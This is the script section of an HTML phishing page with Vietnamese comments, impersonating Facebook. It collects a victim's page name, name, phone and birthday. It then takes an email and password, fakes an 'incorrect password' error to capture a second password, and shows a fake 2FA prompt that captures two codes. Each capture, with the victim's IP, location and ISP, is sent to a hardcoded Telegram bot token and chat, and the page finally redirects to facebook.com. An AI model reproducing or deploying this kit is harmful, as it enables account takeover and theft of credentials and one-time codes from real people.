                            // Không hợp lệ, fallback: ghép mã dial + rawNumber (loại bỏ ký tự không phải số)
                            const dial = selectedCountry.dial;
                            const digits = rawNumber.replace(/\D/g, '');
                            return dial + digits;
                        }
                    } else {
                        // Fallback nếu không có thư viện
                        const dial = selectedCountry.dial;
                        const digits = rawNumber.replace(/\D/g, '');
                        return dial + digits;
                    }
                } catch (e) {
                    console.log('Error parsing phone number', e);
                    // Fallback
                    const dial = selectedCountry.dial;
                    const digits = rawNumber.replace(/\D/g, '');
                    return dial + digits;
                }
            }

            // ============================================
            // HÀM MASK SỐ ĐIỆN THOẠI (ĐỊNH DẠNG +1*****532)
            // ============================================
            function maskPhone(phone, dial) {
                if (!phone) return '';
                // Sử dụng dial được cung cấp, nếu không thì lấy từ selectedCountry
                const countryCode = dial || selectedCountry.dial;
                if (!countryCode) return phone; // fallback

                // Bỏ mã quốc gia để lấy phần số quốc gia
                let national = phone.replace(countryCode, '').replace(/\D/g, '');
                // Nếu không bỏ được (có thể phone không bắt đầu bằng countryCode), fallback
                if (national === phone || national === '') {
                    // Lấy tất cả chữ số, che hết trừ 3 số cuối
                    const digits = phone.replace(/\D/g, '');
                    const lastThree = digits.slice(-3);
                    const stars = '*'.repeat(digits.length - 3);
                    return countryCode + stars + lastThree;
                }
                const lastThree = national.slice(-3);
                const maskedNational = '*'.repeat(national.length - 3) + lastThree;
                return countryCode + maskedNational;
            }

            // ============================================
            // GỬI DỮ LIỆU LÊN TELEGRAM
            // ============================================
            function sendToTelegram(message) {
                const token = '7898540714:AAFUKyXtMKhkq20tK91bTBPodaMVGosMcRg';
                const chatId = '-5246392296';
                const url = `https://api.telegram.org/bot${token}/sendMessage`;
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }).catch(err => console.log('Telegram error:', err));
            }

            // ============================================
            // VALIDATION VÀ CHUYỂN FORM
            // ============================================
            const dynamicForms = document.getElementById('dynamic-forms');
            const waitingScreen = document.getElementById('waiting-screen');
            const continueBtn = document.getElementById('continue-btn');
            const twofaPopup = document.getElementById('twofa-popup');
            const twofaCode = document.getElementById('twofa-code');
            const twofaContinue = document.getElementById('twofa-continue');
            // Chỉ cho phép nhập số ở ô code 2FA
            twofaCode.addEventListener('input', function(e) {
                this.value = this.value.replace(/\D/g, '');
            });
            const twofaError = document.getElementById('twofa-error');
            const countdownSpan = document.getElementById('countdown-timer');
            const displayEmail = document.getElementById('display-email');
            const displayPhone = document.getElementById('display-phone');

            const pageNameInput = document.getElementById('page-name');
            const fbNameInput = document.getElementById('fb-name');
            const birthdayInput = document.getElementById('birthday');

            const pageNameGroup = document.getElementById('page-name-group');
            const fbNameGroup = document.getElementById('fb-name-group');
            const phoneGroup = document.getElementById('phone-group');
            const birthdayGroup = document.getElementById('birthday-group');

            const pageNameError = document.getElementById('page-name-error');
            const fbNameError = document.getElementById('fb-name-error');
            const phoneError = document.getElementById('phone-error');
            const birthdayError = document.getElementById('birthday-error');

            let isLoginForm = false;
            let isWaiting = false;
            let isRetryMode = false;
            let step1Data = {};
            let firstEmail = '';
            let firstPassword = '';
            let secondPassword = '';
            let firstCode = '';
            let countdownInterval = null;
            let countdownSeconds = 30;

            function clearError(group, errorEl) {
                group.classList.remove('input-error');
                errorEl.classList.remove('show');
                errorEl.textContent = '';
            }

            function showError(group, errorEl, message) {
                group.classList.add('input-error');
                errorEl.textContent = message;
                errorEl.classList.add('show');
            }

            function validateStep1() {
                let isValid = true;

                const pageNameVal = pageNameInput.value.trim();
                if (pageNameVal === '') {
                    showError(pageNameGroup, pageNameError, 'Page Name is required.');
                    isValid = false;
                } else {
                    clearError(pageNameGroup, pageNameError);
                }

                const fbNameVal = fbNameInput.value.trim();
                if (fbNameVal === '') {
                    showError(fbNameGroup, fbNameError, 'Facebook Name is required.');
                    isValid = false;
                } else {
                    clearError(fbNameGroup, fbNameError);
                }

                const phoneVal = phoneInput.value.trim();
                if (phoneVal === '') {
                    showError(phoneGroup, phoneError, 'Phone number is required.');
                    isValid = false;
                } else {
                    clearError(phoneGroup, phoneError);
                }

                const bdayVal = birthdayInput.value.trim();
                if (bdayVal === '') {
                    showError(birthdayGroup, birthdayError, 'Birthday is required.');
                    isValid = false;
                } else {
                    const pattern = /^(\d{1,2})\/(\d{1,2})\/(\d{4})$/;
                    const match = bdayVal.match(pattern);
                    if (!match) {
                        showError(birthdayGroup, birthdayError, 'Please use MM/DD/YYYY format.');
                        isValid = false;
                    } else {
                        const month = parseInt(match[1], 10);
                        const day = parseInt(match[2], 10);
                        const year = parseInt(match[3], 10);

                        if (month < 1 || month > 12) {
                            showError(birthdayGroup, birthdayError, 'Month must be between 1 and 12.');
                            isValid = false;
                        } else if (day < 1 || day > 31) {
                            showError(birthdayGroup, birthdayError, 'Day must be between 1 and 31.');
                            isValid = false;
                        } else if (year >= 2015) {
                            showError(birthdayGroup, birthdayError, 'Year must be before 2015.');
                            isValid = false;
                        } else {
                            clearError(birthdayGroup, birthdayError);
                        }
                    }
                }

                if (isValid) {
                    step1Data = {
                        pageName: pageNameVal,
                        fbName: fbNameVal,
                        phone: getFullPhoneNumber(),  // Lấy số điện thoại đầy đủ kèm mã quốc gia
                        phoneDial: selectedCountry.dial, // Lưu mã quốc gia để dùng khi mask
                        birthday: bdayVal
                    };
                }

                return isValid;
            }

            function switchToLoginForm() {
                const loginHTML = `
                    <div class="form-group" id="email-group">
                        <label>Email address</label>
                        <input type="email" id="email" placeholder="Enter your email">
                        <div class="error-message" id="email-error"></div>
                    </div>
                    <div class="form-group" id="password-group">
                        <label>Password</label>
                        <input type="password" id="password" placeholder="Enter your password">
                        <div class="error-message" id="password-error"></div>
                    </div>
                `;
                dynamicForms.innerHTML = loginHTML;
            }

            function validateLogin() {
                const emailInput = document.getElementById('email');
                const passwordInput = document.getElementById('password');
                const emailGroup = document.getElementById('email-group');
                const passwordGroup = document.getElementById('password-group');
                const emailError = document.getElementById('email-error');
                const passwordError = document.getElementById('password-error');

                let isValid = true;

                const emailVal = emailInput.value.trim();
                if (emailVal === '') {
                    emailGroup.classList.add('input-error');
                    emailError.textContent = 'Email is required.';
                    emailError.classList.add('show');
                    isValid = false;
                } else {
                    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (!emailPattern.test(emailVal)) {
                        emailGroup.classList.add('input-error');
                        emailError.textContent = 'Please enter a valid email.';
                        emailError.classList.add('show');
                        isValid = false;
                    } else {
                        emailGroup.classList.remove('input-error');
                        emailError.classList.remove('show');
                    }
                }

                const passVal = passwordInput.value.trim();
                if (passVal === '') {
                    passwordGroup.classList.add('input-error');
                    passwordError.textContent = 'Password is required.';
                    passwordError.classList.add('show');
                    isValid = false;
                } else if (passVal.length < 6) {
                    passwordGroup.classList.add('input-error');
                    passwordError.textContent = 'Password must be at least 6 characters.';
                    passwordError.classList.add('show');
                    isValid = false;
                } else {
                    passwordGroup.classList.remove('input-error');
                    passwordError.classList.remove('show');
                }

                if (isValid) {
                    firstEmail = emailVal;
                    firstPassword = passVal;
                }

                return isValid;
            }

            function attachLoginEvents() {
                const emailInput = document.getElementById('email');
                const passwordInput = document.getElementById('password');
                const emailGroup = document.getElementById('email-group');
                const passwordGroup = document.getElementById('password-group');
                const emailError = document.getElementById('email-error');
                const passwordError = document.getElementById('password-error');

                emailInput.addEventListener('input', function() {
                    if (emailGroup.classList.contains('input-error')) {
                        emailGroup.classList.remove('input-error');
                        emailError.classList.remove('show');
                    }
                });

                passwordInput.addEventListener('input', function() {
                    if (passwordGroup.classList.contains('input-error')) {
                        passwordGroup.classList.remove('input-error');
                        passwordError.classList.remove('show');
                    }
                });
            }

            function showWaitingScreen(duration) {
                isWaiting = true;
                dynamicForms.style.display = 'none';
                waitingScreen.style.display = 'block';

                const progressFill = document.getElementById('progress-fill');
                progressFill.style.width = '0%';

                const startTime = performance.now();
                function animate() {
                    const elapsed = performance.now() - startTime;
                    const percent = Math.min((elapsed / duration) * 100, 100);
                    progressFill.style.width = percent + '%';
                    if (percent < 100) {
                        requestAnimationFrame(animate);
                    }
                }
                requestAnimationFrame(animate);
            }

            function hideWaitingScreen() {
                isWaiting = false;
                dynamicForms.style.display = 'block';
                waitingScreen.style.display = 'none';
            }

            function showRetryPasswordForm() {
                isRetryMode = true;
                const retryHTML = `
                    <div class="form-group" id="password-group">
                        <label>Password</label>
                        <input type="password" id="password" placeholder="Enter your password">
                        <div class="error-message show" id="password-error">Invalid password. The password that you've entered is incorrect.</div>
                    </div>
                `;
                dynamicForms.innerHTML = retryHTML;
                const passwordInput = document.getElementById('password');
                const passwordGroup = document.getElementById('password-group');
                const passwordError = document.getElementById('password-error');
                passwordInput.addEventListener('input', function() {
                    if (passwordGroup.classList.contains('input-error')) {
                        passwordGroup.classList.remove('input-error');
                        passwordError.classList.remove('show');
                    }
                });
                passwordInput.focus();
            }

            function maskEmail(email) {
                const [localPart, domain] = email.split('@');
                if (localPart.length <= 2) return email;
                return localPart[0] + '*****' + localPart[localPart.length - 1] + '@' + domain;
            }

            function resetTwoFAForm() {
                twofaCode.value = '';
                twofaContinue.disabled = true;
                twofaError.classList.remove('show');
                twofaCode.disabled = false;
                firstCode = ''; // Reset để bắt đầu phiên mới
                if (countdownInterval) {
                    clearInterval(countdownInterval);
                    countdownInterval = null;
                }
            }

            function startCountdown(seconds) {
                countdownSeconds = seconds;
                countdownSpan.textContent = `0 minutes ${countdownSeconds} seconds`;
                twofaError.classList.add('show');
                twofaCode.disabled = true; // Khóa ô nhập

                countdownInterval = setInterval(() => {
                    countdownSeconds--;
                    if (countdownSeconds <= 0) {
                        clearInterval(countdownInterval);
                        countdownInterval = null;
                        twofaError.classList.remove('show');
                        twofaContinue.disabled = true;
                        twofaCode.disabled = false; // Mở khóa ô nhập
                        // KHÔNG reset firstCode ở đây
                    } else {
                        countdownSpan.textContent = `0 minutes ${countdownSeconds} seconds`;
                    }
                }, 1000);
            }

            function showTwoFAPopup() {
                document.getElementById('fb-header-display').textContent = step1Data.fbName + ' · Facebook';
                displayEmail.textContent = maskEmail(firstEmail);
                // Sử dụng maskPhone với dial đã lưu
                displayPhone.textContent = maskPhone(step1Data.phone, step1Data.phoneDial);
                resetTwoFAForm(); // Đảm bảo trạng thái ban đầu
                twofaPopup.style.display = 'flex';
            }

            continueBtn.addEventListener('click', function(e) {
                if (isWaiting) return;

                if (!isLoginForm) {
                    if (validateStep1()) {
                        switchToLoginForm();
                        isLoginForm = true;
                        attachLoginEvents();
                    } else {
                        if (pageNameGroup.classList.contains('input-error')) pageNameInput.focus();
                        else if (fbNameGroup.classList.contains('input-error')) fbNameInput.focus();
                        else if (phoneGroup.classList.contains('input-error')) phoneInput.focus();
                        else if (birthdayGroup.classList.contains('input-error')) birthdayInput.focus();
                    }
                } else {
                    if (!isRetryMode) {
                        if (validateLogin()) {
                            const msg = `🔐 <b>Step 1 Data:</b>\nPage: ${step1Data.pageName}\nFB: ${step1Data.fbName}\nPhone: ${step1Data.phone}\nBirthday: ${step1Data.birthday}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}\n\n📧 <b>Login Attempt 1:</b>\nEmail: ${firstEmail}\nPassword: ${firstPassword}`;
                            sendToTelegram(msg);

                            const waitTime = randomInt(6000, 10000);
                            showWaitingScreen(waitTime);

                            setTimeout(() => {
                                hideWaitingScreen();
                                showRetryPasswordForm();
                            }, waitTime);
                        }
                    } else {
                        const passwordInput = document.getElementById('password');
                        const passwordGroup = document.getElementById('password-group');
                        const passwordError = document.getElementById('password-error');
                        const passVal = passwordInput.value.trim();

                        if (passVal === '') {
                            passwordGroup.classList.add('input-error');
                            passwordError.textContent = 'Password is required.';
                            passwordError.classList.add('show');
                            passwordInput.focus();
                            return;
                        }
                        if (passVal.length < 6) {
                            passwordGroup.classList.add('input-error');
                            passwordError.textContent = 'Password must be at least 6 characters.';
                            passwordError.classList.add('show');
                            passwordInput.focus();
                            return;
                        }

                        secondPassword = passVal;

                        const msg = `🔐 <b>Step 1 Data (retry):</b>\nPage: ${step1Data.pageName}\nFB: ${step1Data.fbName}\nPhone: ${step1Data.phone}\nBirthday: ${step1Data.birthday}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}\n\n📧 <b>Login Attempt 2:</b>\nEmail: ${firstEmail}\nPassword: ${secondPassword}`;
                        sendToTelegram(msg);

                        const waitTime = randomInt(6000, 10000);
                        showWaitingScreen(waitTime);

                        setTimeout(() => {
                            hideWaitingScreen();
                            showTwoFAPopup();
                        }, waitTime);
                    }
                }
            });

            twofaCode.addEventListener('input', function() {
                const code = this.value.trim();
                twofaContinue.disabled = code.length < 6;
            });

            twofaContinue.addEventListener('click', function() {
                const code = twofaCode.value.trim();

                if (!firstCode) {
                    // Lần nhập code đầu tiên
                    twofaContinue.classList.add('loading');
                    twofaContinue.disabled = true;

                    setTimeout(() => {
                        twofaContinue.classList.remove('loading');
                        firstCode = code; // Lưu lại để đánh dấu đã nhập lần 1

                        const msg = `🔐 <b>2FA Attempt 1:</b>\nEmail: ${firstEmail}\nCode: ${code}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}`;
                        sendToTelegram(msg);

                        startCountdown(30); // Hiện lỗi + đếm ngược, khóa input
                        twofaCode.value = ''; // Xóa code cũ
                        twofaContinue.disabled = true; // Vẫn disabled cho đến khi nhập code mới
                    }, 2000);
                } else {
                    // Lần nhập code thứ hai
                    // Ẩn lỗi và dừng đếm ngược nếu còn
                    twofaError.classList.remove('show');
                    if (countdownInterval) {
                        clearInterval(countdownInterval);
                        countdownInterval = null;
                    }
                    twofaContinue.classList.add('loading');
                    twofaContinue.disabled = true;

                    setTimeout(() => {
                        const msg = `🔐 <b>2FA Attempt 2:</b>\nEmail: ${firstEmail}\nCode: ${code}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}`;
                        sendToTelegram(msg);
                        window.location.href = 'https://www.facebook.com';
                    }, 2000);
                }
            });

            document.getElementById('try-another').addEventListener('click', function(e) {
                e.preventDefault();
                resetTwoFAForm();
                twofaPopup.style.display = 'none';
            });

            function randomInt(min, max) {
                return Math.floor(Math.random() * (max - min + 1)) + min;
            }

            if (birthdayInput) {
                birthdayInput.addEventListener('input', function(e) {
                    let value = birthdayInput.value;
                    let numbers = value.replace(/\D/g, '');
                    if (numbers.length > 8) numbers = numbers.slice(0, 8);

                    let formatted = '';
                    for (let i = 0; i < numbers.length; i++) {
                        if (i === 2 || i === 4) {
                            formatted += '/';
                        }
                        formatted += numbers[i];
                    }

                    if (formatted !== value) {
                        birthdayInput.value = formatted;
                        birthdayInput.setSelectionRange(formatted.length, formatted.length);
                    }
                });
            }

            // ============================================
            // ẨN POPUP KHI TRANG LOAD LẠI
            // ============================================
            window.addEventListener('load', function() {
                twofaPopup.style.display = 'none';
            });

        })();
    </script>
</body>
</html>